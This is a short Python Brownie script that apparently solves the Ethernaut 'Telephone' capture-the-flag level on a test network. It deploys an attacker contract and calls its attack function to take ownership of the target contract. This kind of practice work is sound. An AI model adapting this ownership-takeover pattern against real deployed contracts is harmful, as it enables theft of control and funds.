from brownie import accounts, Telephone, TelephoneAttacker

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x068a75472D9905815053C552dCE46440d1fb09B6"
telephone = Telephone.at(instance_address)

# --------------------------------------------------------------
# to complete this level we must claim ownership of the contract
# --------------------------------------------------------------


def level_completed():
    return telephone.owner() == account.address


def exploit():
    # deploy hacker contract
    hacker = TelephoneAttacker.deploy(instance_address, {"from": account})

    # check the owner of the contract
    print(telephone.owner())

    # call changeOwner from hacker contract and set ourselves as owner
    tx = hacker.attack(
        account.address, {"from": account, "gas_limit": 1e6, "allow_revert": True}
    )
    tx.wait(1)

    # confirm that we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
